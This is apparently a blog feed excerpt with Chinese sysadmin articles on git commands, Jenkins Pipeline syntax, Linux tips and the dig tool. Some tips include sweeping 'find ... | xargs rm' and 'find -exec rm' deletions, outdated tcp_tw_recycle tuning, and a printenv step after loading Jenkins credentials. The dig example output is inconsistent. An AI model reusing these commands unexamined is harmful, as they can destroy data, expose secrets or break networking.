<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff &lt;file&gt; # 比较当前文件和暂存区文件差异 git diff</span><br><span class="line"></span><br><span class="line">git diff &lt;id1&gt;&lt;id1&gt;&lt;id2&gt; # 比较两次提交之间的差异</span><br><span class="line"></span><br><span class="line">git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较</span><br><span class="line"></span><br><span class="line">git diff --staged # 比较暂存区和版本库差异</span><br><span class="line"></span><br><span class="line">git diff --cached # 比较暂存区和版本库差异</span><br><span class="line"></span><br><span class="line">git diff --stat # 仅仅比较统计信息</span><br></pre></td></tr></table></figure>

<p><strong>查看提交记录</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log git log &lt;file&gt; # 查看该文件每次提交记录</span><br><span class="line"> </span><br><span class="line">git log -p &lt;file&gt; # 查看每次详细修改内容的diff</span><br><span class="line"> </span><br><span class="line">git log -p -2 # 查看最近两次详细修改内容的diff</span><br><span class="line"> </span><br><span class="line">git log --stat #查看提交统计信息</span><br></pre></td></tr></table></figure>

<p><strong>查看、切换、创建和删除分支</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git br -r # 查看远程分支</span><br><span class="line"> </span><br><span class="line">git br &lt;new_branch&gt; # 创建新的分支</span><br><span class="line"> </span><br><span class="line">git br -v # 查看各个分支最后提交信息</span><br><span class="line"> </span><br><span class="line">git br --merged # 查看已经被合并到当前分支的分支</span><br><span class="line"> </span><br><span class="line">git br --no-merged # 查看尚未被合并到当前分支的分支</span><br><span class="line"> </span><br><span class="line">git co &lt;branch&gt; # 切换到某个分支</span><br><span class="line"> </span><br><span class="line">git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去</span><br><span class="line"> </span><br><span class="line">git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branch</span><br><span class="line"> </span><br><span class="line">git co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除</span><br><span class="line"> </span><br><span class="line">git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支</span><br><span class="line"> </span><br><span class="line">git br -d &lt;branch&gt; # 删除某个分支</span><br><span class="line"> </span><br><span class="line">git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制)</span><br></pre></td></tr></table></figure>

<p><strong>分支合并和rebase</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge &lt;branch&gt; # 将branch分支合并到当前分支</span><br><span class="line"> </span><br><span class="line">git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交</span><br><span class="line"> </span><br><span class="line">git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt;</span><br></pre></td></tr></table></figure>

<p><strong>补丁管理</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff &gt; ../sync.patch # 生成补丁</span><br><span class="line"></span><br><span class="line">git apply ../sync.patch # 打补丁</span><br><span class="line"></span><br><span class="line">git apply --check ../sync.patch #测试补丁能否成功</span><br></pre></td></tr></table></figure>

<p><strong>暂存管理</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git stash # 暂存</span><br><span class="line"> </span><br><span class="line">git stash list # 列所有stash</span><br><span class="line"> </span><br><span class="line">git stash apply # 恢复暂存的内容</span><br><span class="line"> </span><br><span class="line">git stash drop # 删除暂存区</span><br></pre></td></tr></table></figure>

<p><strong>远程分支管理</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull # 抓取远程仓库所有分支更新并合并到本地</span><br><span class="line"></span><br><span class="line">git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并</span><br><span class="line"></span><br><span class="line">git fetch origin # 抓取远程仓库更新</span><br><span class="line"></span><br><span class="line">git merge origin/master # 将远程主分支合并到本地当前分支</span><br><span class="line"></span><br><span class="line">git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支</span><br><span class="line"></span><br><span class="line">git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上</span><br><span class="line"></span><br><span class="line">git push # push所有分支</span><br><span class="line"></span><br><span class="line">git push origin master # 将本地主分支推到远程主分支</span><br><span class="line"></span><br><span class="line">git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)</span><br><span class="line"></span><br><span class="line">git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名</span><br><span class="line"></span><br><span class="line">git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支</span><br><span class="line"></span><br><span class="line">git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支</span><br></pre></td></tr></table></figure>

<p><strong>远程仓库管理</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v # 查看远程服务器地址和仓库名称</span><br><span class="line"> </span><br><span class="line">git remote show origin # 查看远程服务器仓库状态</span><br><span class="line"> </span><br><span class="line">git remote add origin git@ github:wandouduoduo/wandouduoduo.git # 添加远程仓库地址</span><br><span class="line"> </span><br><span class="line">git remote set-url origin git@ github.com:wandouduoduo/wandouduoduo.git # 设置远程仓库地址(用于修改远程仓库地址) </span><br><span class="line"></span><br><span class="line">git remote rm &lt;repository&gt; # 删除远程仓库</span><br></pre></td></tr></table></figure>

<p><strong>创建远程仓库</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir wandouduoduo &amp;&amp; cd wandouduoduo &amp;&amp; git --bare init # 在服务器创建纯仓库</span><br><span class="line"> </span><br><span class="line">git remote add origin git@ github.com:wandouduoduo/wandouduoduo.git # 设置远程仓库地址</span><br><span class="line"> </span><br><span class="line">git push -u origin master # 客户端首次提交</span><br><span class="line"> </span><br><span class="line">git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且track</span><br><span class="line"> </span><br><span class="line">git remote set-head origin master # 设置远程仓库的HEAD指向master分支</span><br></pre></td></tr></table></figure>

<p><strong>也可以命令设置跟踪远程库和本地库</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch --set-upstream master origin/master</span><br><span class="line"> </span><br><span class="line">git branch --set-upstream develop origin/develop</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转Jenkins Pipeline</title>
    <url>/articles/b3592bd0.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Pipeline，简而言之，就是一套运行于Jenkins上的工作流框架，将原本独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排与可视化。</p>
<p>Pipeline是Jenkins2.X的最核心的特性，帮助Jenkins实现从CI到CD与DevOps的转变。Pipeline是一组插件，让Jenkins可以实现持续交付管道的落地和实施。</p>
<p>持续交付管道（CD Pipeline）是将软件从版本控制阶段到交付给用户或客户的完整过程的自动化表现。软件的每一次更改（提交到源代码管理系统）都要经过一个复杂的过程才能被发布。</p>
<p>Pipeline提供了一组可扩展的工具，通过Pipeline Domain Specific Language（DSL）syntax可以达到Pipeline as Code（Jenkinsfile存储在项目的源代码库）的目的。</p>
<a id="more"></a>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p><strong>Stage: 阶段</strong></p>
<p>一个Pipeline可以划分成若干个Stage，每个Stage代表一组操作，例如：“Build”，“Test”，“Deploy”。</p>
<p><em>注意，Stage是一个逻辑分组的概念，可以跨多个Node</em></p>
<p><strong>Node：节点</strong></p>
<p>一个Node就是一个Jenkins节点，或者是Master，或者是Agent，是执行Step的具体运行环境。</p>
<p><strong>Step：步骤</strong></p>
<p>Step是最基本的操作单元，小到创建一个目录，大到构建一个Docker镜像，由各类Jenklins Plugin提供，例如：sh ‘make’</p>
<p><strong>Pipeline五大特性</strong></p>
<p>代码:Pipeline以代码的形式实现，通常被检入源代码控制，使团队能够编辑、审查和迭代其CD流程。<br>可持续性：Jenklins重启或者中断后都不会影响Pipeline Job。<br>停顿：Pipeline可以选择停止并等待任工输入或批准，然后再继续Pipeline运行。<br>多功能：Pipeline支持现实世界的复杂CD要求，包括fork/join子进程，循环和并行执行工作的能力<br>可扩展：Pipeline插件支持其DSL的自定义扩展以及与其他插件集成的多个选项。<br>Pipeline和Freestyle的区别</p>
<h2 id="Freestyle和Pipeline区别"><a href="#Freestyle和Pipeline区别" class="headerlink" title="Freestyle和Pipeline区别"></a>Freestyle和Pipeline区别</h2><p><img src="/articles/b3592bd0/1.png" alt></p>
<p><img src="/articles/b3592bd0/2.png" alt></p>
<p><strong>Freestyle</strong>：<br>上游/下游Job调度，如<br>BuildJob —&gt; TestJob —&gt; DeployJob<br>在DSL Job里面调度多个子Job（利用Build Flow Plugin）</p>
<p><strong>Pipeline</strong>：<br>单个Job中完成所有的任务编排 </p>
<p>Multibranch Pipeline根据你的代码中Jenlinsfile自动创建Job</p>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>Pipeline脚本是由Groovy语言实现（无需专门学习）</p>
<p><em>支持两种语法</em><br><em>Declarative 声明式（在Pipeline plugin 2.5中引入）</em><br><em>Scripted Pipeline 脚本式</em></p>
<p>如何创建最基本的PIpeline<br>直接在Jenkins Web UI 网页界面中输入脚本<br>通过创建一个jenkinsfile可以检入项目的源代码管理库</p>
<p>通常推荐在Jenkins中直接从源代码控制（SCM）中载入Jenklinsfile Pipeline</p>
<p>声明式Pipeline</p>
<p>声明式Pipeline的基本语法和表达式遵循与Groovy语法相同的规则，但有以下例外：</p>
<p>声明式pipeline必须包含在固定格式pipeline{}快内<br>每个声明语句必须独立一行，行尾无需使用分号</p>
<p>块（blocks{}）只能包含章节（Sections），指令（Directives），步骤（Steps）或赋值语句<br>属性引用语句被视为无参数方法调用。例：输入被视为 input()<br>块（blocks{}）<br>由大括号括起来的语句，如pipeline{},Section{},parameters{},script{}<br>章节（Sections）<br>通常包含一个或多个指令或步骤。如 agent 、post、stages、steps<br>指令（Directives）<br>environment、options、parameters、triggers（触发）、stage、tools、when<br>步骤（Steps）<br>Pipeline steps reference<br>执行脚本式pipeline：使用script{}</p>
<p>agent<br>必须存在，agent必须在pipeline块内的顶层定义，但stage内是否使用使可选的<br>参数：any/none/label/node/docker/dockerfile<br>常用选项 label/cuetomWorkspace/reuseNode</p>
<p>示例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">agent &#123; label &apos;my-label&apos; &#125;</span><br><span class="line"></span><br><span class="line">agent &#123;</span><br><span class="line">    node &#123;</span><br><span class="line">        label &apos;my-label&apos;</span><br><span class="line">        customWorkspace &apos;/some/other/path&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">agent &#123;</span><br><span class="line">    docker &#123;</span><br><span class="line">        image &apos;nginx:1.12.2&apos;</span><br><span class="line">        label &apos;my-label&apos;</span><br><span class="line">        args &apos;-v /tmp:/tmp&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>post 不是必须的，用于pipeline的最外层或者stage{}中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(&apos;Example&apos;)&#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">            echo &apos;Hello world&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    post &#123;</span><br><span class="line">        always &#123;</span><br><span class="line">            echo &apos;say goodbay&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>stages 必须，包括顺序执行的一个或多个stage命令，在pipeline内仅能使用一次，通常位于agent/options后面，例子如上</p>
<p>steps 必须，steps位于stage指令块内部，包括一个或多个step。仅有一个step的情况下可以忽略关键字step及其{},例子如上</p>
<p>environment 不是必须的，environment定义了一组全局的环境变量键值对，存在于pipeline{}或者stage指令内。执行特殊方法credentials()可以获取jenkins中预定义的凭证明文内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">environment &#123;CC=&apos;clang&apos;&#125;</span><br><span class="line">environment &#123;AN_ACCESS_KEY = credentials(&apos;my-prefined-secret-text&apos;)&#125;</span><br><span class="line">steps &#123;sh &apos;printenv&apos;&#125;</span><br></pre></td></tr></table></figure>

<p>options 不是必须的 预定义pipeline专有的配置信息，仅可定义一次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line">    options&#123;</span><br><span class="line">    timeout(time:1,unit: &apos;HOURS&apos;)</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>parameters 不是必须的 定义参数化构建的参数可选参数 booleanParam,choice,file,text,password,run,string</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">paramenters &#123;</span><br><span class="line">    choice(name:&apos;PerformMavenRelease&apos;,choices:&apos;False\nTrue&apos;,description:&apos;desc&apos;)</span><br><span class="line">    password(name:&apos;CredsToUse&apos;,description:&apos;Apassword to build with&apos;,defaultValue:&apos;&apos;)</span><br><span class="line">&#125;</span><br><span class="line">environment &#123;</span><br><span class="line">    BUILD_USR_CHOICE=&quot;$&#123;params.PerformMavenRelease&#125;&quot;</span><br><span class="line">    BUILD_USR_CREDS=&quot;$&#123;params.CredsToUse&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>triggers 不是必须的 定义pipeline被自动触发的方式选项 cron、pollSCM、upstream</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">triggers &#123;cron(&apos;H 4/* 0 0 1-5&apos;)&#125;</span><br><span class="line">triggers &#123;pollSCM(&apos;H 4/* 0 0 1-5&apos;)&#125;</span><br><span class="line">triggers &#123;upstream(upstreamProjects:&apos;job1,job2&apos;,threshold:hudson.model.Result.SUCCESS)&#125;</span><br></pre></td></tr></table></figure>

<h2 id="快速创建一个pipeline"><a href="#快速创建一个pipeline" class="headerlink" title="快速创建一个pipeline"></a>快速创建一个pipeline</h2><p>新建 选择pipeline 填写Job 的名字 </p>
<p>填写相应的pipeline script</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pipeline&#123;</span><br><span class="line">    agent any</span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(&apos;Build&apos;) &#123;</span><br><span class="line">            steps&#123;</span><br><span class="line">                echo &apos;This is a build step&apos; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(&apos;Test&apos;) &#123;</span><br><span class="line">            steps&#123;</span><br><span class="line">                echo &apos;This is a test step&apos;  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stage(&apos;Deploy&apos;) &#123;</span><br><span class="line">            steps&#123;</span><br><span class="line">                echo &apos;This is a deploy step&apos;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存之后，立即构建</p>
<h2 id="常用的辅助工具"><a href="#常用的辅助工具" class="headerlink" title="常用的辅助工具"></a>常用的辅助工具</h2><p>Snipper Generator（代码片段生成器，语法检查器）<br>Replay Pipeline（重放pipeline，可以修改script，修改后的不存入config.xml）<br>DSL Reference 语法参考手册<br>全局变量引用<br>Stage View<br>BlueOcean(可视化)<br>Pipeline神器：可视化编辑器<br>命令行Pipeline调试工具</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux用法技巧</title>
    <url>/articles/1d19f8d4.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>根据自己多年的工作经历和经验，对日常中的细节技巧和用法进行归纳和总结。</p>
<p>持续更新中…</p>
<a id="more"></a>

<h2 id="技巧详解"><a href="#技巧详解" class="headerlink" title="技巧详解"></a>技巧详解</h2><h3 id="指定特定用户执行命令"><a href="#指定特定用户执行命令" class="headerlink" title="指定特定用户执行命令"></a>指定特定用户执行命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -H -u www bash -c 'nohup /home/web/ke/upfileserver /home/web/ke/up/conf.json &amp;'</span><br></pre></td></tr></table></figure>

<h3 id="统计机器中网络连接各个状态个数"><a href="#统计机器中网络连接各个状态个数" class="headerlink" title="统计机器中网络连接各个状态个数"></a>统计机器中网络连接各个状态个数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -an | awk '/^tcp/ &#123;++S[$NF]&#125;  END &#123;for (a in S) print a,S[a]&#125; '</span><br></pre></td></tr></table></figure>

<h3 id="删除乱码"><a href="#删除乱码" class="headerlink" title="删除乱码"></a>删除乱码</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . ! -regex '.*\.jar\|.*\.war\|.*\.zip'|xargs rm</span><br></pre></td></tr></table></figure>

<h3 id="过滤IP"><a href="#过滤IP" class="headerlink" title="过滤IP"></a>过滤IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -E -o "172.18.[0-9]&#123;1,3&#125;[\.][0-9]&#123;1,3&#125;" filename</span><br></pre></td></tr></table></figure>

<h3 id="获取本机IP"><a href="#获取本机IP" class="headerlink" title="获取本机IP"></a>获取本机IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ipaddr=$(ip addr | awk '/^[0-9]+: / &#123;&#125;; /inet.*global/ &#123;print gensub(/(.*)\/(.*)/, "\\1", "g", $2)&#125;')</span><br><span class="line"></span><br><span class="line">echo $ipaddr</span><br></pre></td></tr></table></figure>

<h3 id="TIME-WAIT过多的解决办法"><a href="#TIME-WAIT过多的解决办法" class="headerlink" title="TIME_WAIT过多的解决办法"></a><strong>TIME_WAIT过多的解决办法</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查看当前状态</span><br><span class="line">cat /proc/sys/net/ipv4/tcp_tw_reuse</span><br><span class="line">cat /proc/sys/net/ipv4/tcp_tw_recycle</span><br><span class="line">netstat -n | awk '/^tcp/ &#123;++state[$NF]&#125; END &#123;for(key in state) print key,"/t",state[key]&#125;'</span><br><span class="line"></span><br><span class="line">修改内核参数</span><br><span class="line">方法一：直接修改参数文件</span><br><span class="line">echo "1" &gt; /proc/sys/net/ipv4/tcp_tw_reuse</span><br><span class="line"><span class="meta">#</span><span class="bash">让TIME_WAIT尽快回收，我也不知是多久，观察大概是一秒钟</span></span><br><span class="line">echo "1" &gt; /proc/sys/net/ipv4/tcp_tw_recycle</span><br><span class="line">方法二：命名修改内核参数并生效</span><br><span class="line">[root@aaa1 ~]# sysctl -a|grep net.ipv4.tcp_tw</span><br><span class="line">net.ipv4.tcp_tw_reuse = 0</span><br><span class="line">net.ipv4.tcp_tw_recycle = 0</span><br><span class="line">[root@aaa1 ~]#</span><br><span class="line"></span><br><span class="line">vi /etc/sysctl</span><br><span class="line">增加或修改net.ipv4.tcp_tw值：</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line"></span><br><span class="line">使内核参数生效：</span><br><span class="line">[root@aaa1 ~]# sysctl -p</span><br><span class="line"></span><br><span class="line">[root@aaa1 ~]# sysctl -a|grep net.ipv4.tcp_tw</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1</span><br><span class="line">net.ipv4.tcp_tw_recycle = 1</span><br><span class="line"></span><br><span class="line">用netstat再观察正常</span><br></pre></td></tr></table></figure>

<h3 id="Linux-Top命令-选择显示列及列排序"><a href="#Linux-Top命令-选择显示列及列排序" class="headerlink" title="Linux Top命令 选择显示列及列排序"></a>Linux Top命令 选择显示列及列排序</h3><p>Top用于查看Linux系统下进程信息，有时候需要选择显示那些列，以及按照某一列进行排序。查询整理如下：</p>
<p>选择显示列：<br>执行top命令后，按 f 键，再按某一列的代表字母，即可选中或取消显示；</p>
<p>列显示位置调整：<br>执行top命令后，按 o 键，选择要调整位置的列（如K:CUP Usageage），按动一下大写K则显示位置往上调整，按动一下小写K则显示位置往下调整。</p>
<p>列排序：<br>执行top命令后，按 shift + f（小写），进入选择排序列页面，再按要排序的列的代表字母即可；</p>
<p>输入大写P，则结果按CPU占用降序排序。输入大写M，结果按内存占用降序排序。（注：大写P可以在capslock状态输入p，或者按Shift+p）</p>
<h3 id="no-space-left-on-device的解决方法-iNode满导致"><a href="#no-space-left-on-device的解决方法-iNode满导致" class="headerlink" title="no space left on device的解决方法(iNode满导致)"></a>no space left on device的解决方法(iNode满导致)</h3><p>今天在腾讯云的服务器被攻击后，apache启动报错，查找原因发现是磁盘空间不够no space left on device，</p>
<p><img src="/articles/1d19f8d4/1.png" alt="img"></p>
<p>诡异的是df命令磁盘占用仅55%</p>
<p><img src="/articles/1d19f8d4/2.png" alt="img"></p>
<p>继续查找原因，发现是iNode已满，即没有索引空间</p>
<p><img src="/articles/1d19f8d4/3.png" alt="img"></p>
<p>这就好办了，首先定位哪个目录占用iNode最多，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find */ ! -type l | cut -d / -f 1 | uniq -c</span><br></pre></td></tr></table></figure>

<p>定位完成，清理目录，整个世界都清净了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /tmp -type f -exec rm &#123;&#125; \;</span><br><span class="line"></span><br><span class="line">find /home -type f -size 0 -exec rm &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1d19f8d4/4.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Dig命令详解</title>
    <url>/articles/4352880d.html</url>
    <content><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a><strong>简介：</strong></h2><p>Dig是一个在类Unix命令行模式下查询DNS包括NS记录，A记录，MX记录等相关信息的工具。由于一直缺失<br>Dig man page文档，本文就权当一个dig使用向导吧。Dig的源码是ISC BIND大包的一部分，但是大多编译和安装Bind的文档都不把它包括在内，但是在linux系统下，它通常是某个包的一部分，在Gentoo下是bind-tools，在Redhat/Fedora下是 bind-utils，或者在Debian下是 dnsutils。<br>如果你要查找Bind的配置相关的信息，请详读<a href="http://www.madboa.com/geek/soho-bind/" target="_blank" rel="noopener">参考文档</a>。</p>
<p>看懂默认输出：最简单最常见的查询是查询一台主机，但是默认情况下，Dig的输出信息很详细。你可能不需要所有的输出，但是它确实值得知道。</p>
<a id="more"></a>

<h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下面是一个带有注释的查询：</span><br><span class="line"><span class="meta">$</span><span class="bash"> dig www.isc.org</span></span><br><span class="line">上面是我调用dig 的命令行。</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.2.3 &lt;&lt;&gt;&gt; www.isc.org</span><br><span class="line">;; global options:  printcmd</span><br><span class="line">Dig的部分输出告诉我们一些有关于它的版本信息(version 9.2.3)和全局的设置选项，如果+nocmd在命令行下</span><br><span class="line">是第一个参数的话，那么这部分输出可以通过加+nocmd的方式查询出来。</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 43071</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 3, ADDITIONAL: 3</span><br><span class="line">在这里，Dig告诉我们一些从DNS返回的技术信息，这段信息可以用选项 +[no]comments来控制显示，但是小心</span><br><span class="line">，禁止掉comments也可能关闭一些其它的选项。</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;www.isc.org.                   IN      A</span><br><span class="line">在这个查询段中，Dig显示出我们查询的输出，默认的查询是查询A记录，你可以显示或者禁止掉这些用+[no]</span><br><span class="line">question选项</span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">www.isc.org.            600     IN      A       204.152.184.88</span><br><span class="line">最后，我们得到我们查询的结果。www.isc.org 的地址是204.152.184.8，我不知道为什么你们更喜欢过滤掉</span><br><span class="line">这些输出，但是你可以用+[no]answer保留这些选项。</span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">isc.org.                2351    IN      NS      ns-int.isc.org.</span><br><span class="line">isc.org.                2351    IN      NS      ns1.gnac.com.</span><br><span class="line">isc.org.                2351    IN      NS      ns-ext.isc.org.</span><br><span class="line">这段权威说明告诉我们哪个DNS服务器给我们提供权威的答案。在这个例子中，isc.org有3个Name Server，你</span><br><span class="line">可以用+[no]authority选项保留这段输出。</span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">ns1.gnac.com.           171551  IN      A       209.182.216.75</span><br><span class="line">ns-int.isc.org.         2351    IN      A       204.152.184.65</span><br><span class="line">ns-int.isc.org.         2351    IN      AAAA    2001:4f8:0:2::15</span><br><span class="line">这些额外选项很有代表性地包含了列出的权威DNS的IP地址，这段输出可以用+[no]additional选项保留。</span><br><span class="line">;; Query time: 2046 msec</span><br><span class="line">;; SERVER: 127.0.0.1#53(127.0.0.1)</span><br><span class="line">;; WHEN: Fri Aug 27 08:22:26 2004</span><br><span class="line">;; MSG SIZE  rcvd: 173</span><br><span class="line">最后一段默认输出包含了查询的统计数据，可以用+[no]stats保留。</span><br></pre></td></tr></table></figure>

<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>最后一段默认输出包含了查询的统计数据，可以用+[no]stats保留。</p>
<h4 id="我们可以查询什么呢？"><a href="#我们可以查询什么呢？" class="headerlink" title="我们可以查询什么呢？"></a><strong>我们可以查询什么呢？</strong></h4><p>Dig可以让你有效地查询DNS，最常用的查询是A记录，TXT（文本注释），MX记录，NS记录，或者任意综合查询。</p>
<p>查找yahoo.com的A记录：（此处一定是域而不是主机，如我公司为xinpindao.com)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dig yahoo.com A +noall +answer</span><br></pre></td></tr></table></figure>

<p>查找yahoo.com MX记录的列表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig yahoo.com MX +noall +answer</span><br></pre></td></tr></table></figure>

<p>查找yahoo.com的权威DNS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig yahoo.com NS +noall +answer</span><br></pre></td></tr></table></figure>

<p>查询上面所有的记录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig yahoo.com ANY +noall +answer</span><br></pre></td></tr></table></figure>

<p>在现在这种IPv4和IPV6混用的情况下，你也可以使用AAAA的选项查询主机的IPv6 AAAA记录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dig yahoo.com AAAA +short</span><br></pre></td></tr></table></figure>

<p>如果你要查询的域允许转发，你也可以查询到相关的信息，比如DNS记录在internet上的生存周期，但是，现<br>在只有很少的DNS允许无限制转发。</p>
<h4 id="我们怎样查询？获得精简答案呢？"><a href="#我们怎样查询？获得精简答案呢？" class="headerlink" title="我们怎样查询？获得精简答案呢？"></a><strong>我们怎样查询？获得精简答案呢？</strong></h4><p>当我们需要一个快速回答时，+short选项是你最好的朋友:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig yahoo.com +short</span><br><span class="line">204.152.184.88</span><br></pre></td></tr></table></figure>

<h4 id="获得一个不是十分精简的答案？"><a href="#获得一个不是十分精简的答案？" class="headerlink" title="获得一个不是十分精简的答案？"></a><strong>获得一个不是十分精简的答案？</strong></h4><p>精简答案和只有一个答案是不一样的，</p>
<p>获得没有附加信息的详细答案的方法是使用+noall选项，这样就只保留你想要的输出。<br>下面是只有一个答案的精简查询，最后包含所有的配置信息，包括TTL数据，格式化的BIND配置信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dig fsf.org mx +short</span></span><br><span class="line">20 mx20.gnu.org.</span><br><span class="line">30 mx30.gnu.org.</span><br><span class="line">10 mx10.gnu.org.</span><br><span class="line"><span class="meta">$</span><span class="bash"> dig +nocmd fsf.org mx +noall +answer</span></span><br><span class="line">fsf.org.                3583    IN      MX      30 mx30.gnu.org.</span><br><span class="line">fsf.org.                3583    IN      MX      10 mx10.gnu.org.</span><br><span class="line">fsf.org.                3583    IN      MX      20 mx20.gnu.org.</span><br></pre></td></tr></table></figure>

<h4 id="获得一个详细答案？"><a href="#获得一个详细答案？" class="headerlink" title="获得一个详细答案？"></a><strong>获得一个详细答案？</strong></h4><p>通过它的man page，你可以通过+multiline选项获得冗长的多行模式人性化注释的DSN的SOA记录，一般来说，<br>用+multiline选项获得的信息可以显示很多，就像BIND配置文件一样。</p>
